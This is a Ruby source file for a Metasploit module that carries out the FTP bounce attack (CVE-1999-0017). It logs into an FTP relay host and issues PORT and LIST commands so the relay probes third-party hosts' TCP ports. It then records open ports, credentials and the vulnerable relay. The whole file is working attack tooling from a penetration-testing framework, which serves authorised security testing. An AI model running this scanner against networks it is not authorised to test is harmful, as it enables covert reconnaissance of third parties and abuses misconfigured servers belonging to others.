##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Order is important here
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Ftp
  include Msf::Module::Deprecated
  moved_from 'auxiliary/scanner/portscan/ftpbounce'

  def initialize
    super(
      'Name' => 'FTP Bounce Port Scanner',
      'Description' => %q{
        This module performs the FTP bounce attack by using FTP's PORT/LIST commands to
        proxy a port scan through a "FTP relay host" (BOUNCEHOST/BOUNCEPORT) to
        enumerate TCP services (RHOSTS/PORTS).

        NOTE: Per RFC 2577, a compliant FTP server should refuse PORT commands that
        target privileged ports (<= 1023/TCP), so those ports may not be scannable
        via FTP bounce even on an otherwise vulnerable relay.

        NOTE: IPv6 targets are not supported.
      },
      'Author' => 'kris katterjohn',
      'License' => MSF_LICENSE,
      'References' => [
        [ 'CVE', '1999-0017' ]
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )

    register_options([
      OptAddressRange.new('RHOSTS', [true, 'The host(s) to scan via BOUNCEHOST (FTP relay)']), # Overwrite the mixin default value
      OptString.new('PORTS', [true, 'Ports to scan (e.g. 22-25,80,110-900)', '1024-10000']),
      OptAddress.new('BOUNCEHOST', [true, 'FTP relay host']),
      OptPort.new('BOUNCEPORT', [true, 'FTP relay port', 21]),
      OptString.new('FTPUSER', [false, 'Username for the FTP relay (BOUNCEHOST)', 'anonymous']), # Already defined in Msf::Exploit::Remote::Ftp, but in advanced section
      OptString.new('FTPPASS', [false, 'Password for the FTP relay (BOUNCEHOST)', 'mozilla@example.com']), # Already defined in Msf::Exploit::Remote::Ftp, but in advanced section
      OptInt.new('DELAY', [true, 'The delay between connections, per thread, in milliseconds', 0]),
      OptInt.new('JITTER', [true, 'The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.', 0])
    ])

    deregister_options('RPORT')
  end

  # No IPv6 support yet
  def support_ipv6?
    false
  end

  def rhost
    datastore['BOUNCEHOST']
  end

  def rport
    datastore['BOUNCEPORT']
  end

  def register_ftp_creds(ip)
    report_note(
      host: rhost,
      port: rport,
      proto: 'tcp',
      type: 'ftp.bounce',
      data: { info: 'Attempted to use machine for FTP bounce attack', target: ip }
    )

    service_data = {
      address: rhost,
      port: rport,
      service_name: 'ftp',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      private_data: datastore['FTPPASS'],
      private_type: :password,
      username: datastore['FTPUSER'],
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end

  def run_host(ip)
    ports = Rex::Socket.portspec_crack(datastore['PORTS'])
    raise Msf::OptionValidateError, ['PORTS'] if ports.empty?

    jitter_value = datastore['JITTER'].to_i
    raise Msf::OptionValidateError, ['JITTER'] if jitter_value < 0

    delay_value = datastore['DELAY'].to_i
    raise Msf::OptionValidateError, ['DELAY'] if delay_value < 0

    vprint_warning('Scanning relay host via itself') if rhost == ip

    connected = connect_login

    unless connected
      print_error("Could not authenticate to relay #{rhost}:#{rport} (check FTPUSER/FTPPASS)")
      return
    end

    # This is for the FTP relay (BOUNCEHOST/BOUNCEPORT)
    register_ftp_creds(ip)

    open_ports = []
    host_up = false
    port_accepted = false

    ports.each do |port|
      # Clear out the receive buffer since we're heavily dependent
      # on the response codes.  We need to do this between every
      # port scan attempt unfortunately.
      loop do
        r = sock.get_once(-1, 0.25)
        break if (!r) || r.empty?
      end

      begin
        # Add the delay based on JITTER and DELAY if needs be
        add_delay_jitter(delay_value, jitter_value)

        host = (ip.split('.') + [port / 256, port % 256]).join(',')
        resp = send_cmd(['PORT', host])

        # RFC 2577
        if resp =~ /^5/ && port < 1024
          vprint_warning("#{rhost}:#{rport} -> #{ip}:#{port}: PORT rejected (port <= 1023/TCP blocked by server, which is expected) -- #{resp.strip}")
          next
        elsif resp =~ /^5/
          vprint_warning("#{rhost}:#{rport} -> #{ip}:#{port}: PORT rejected -- #{resp.strip}")
          next
        elsif !resp
          print_error("#{rhost}:#{rport} -> #{ip}:#{port}: No response!")
          next
        end

        port_accepted = true
        resp = send_cmd(['LIST'])

        if resp =~ /^[12]/
          print_good("#{rhost}:#{rport} -> #{ip}:#{port}: LIST -- TCP OPEN")
          report_service(host: ip, port: port, proto: 'tcp', info: "Discovered via FTP bounce from #{rhost}:#{rport}")
          open_ports << port
        else
          vprint_warning("#{rhost}:#{rport} -> #{ip}:#{port}: LIST -- #{resp.strip}")
          host_up = true if resp.to_s =~ /connection refused/i
        end
      rescue ::StandardError
        print_error("Unknown error: #{$ERROR_INFO}")
      end
    end

    report_host(host: ip) if host_up

    if open_ports.empty?
      msg = "#{ports.length} port(s) scanned via #{rhost}:#{rport}, none open"
      msg << ' (relay may block FTP bounce)' unless port_accepted
      print_status(msg)
    else
      print_good("#{ports.length} port(s) scanned via #{rhost}:#{rport}, #{open_ports.length} port(s) open: #{open_ports.join(', ')}")
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: 'FTP Bounce Attack',
        info: "FTP Relay accepted PORT/LIST to #{ip}:#{open_ports.join(',')}",
        refs: references
      )
    end
  rescue ::Interrupt
    raise $ERROR_INFO
  ensure
    disconnect
  end
end
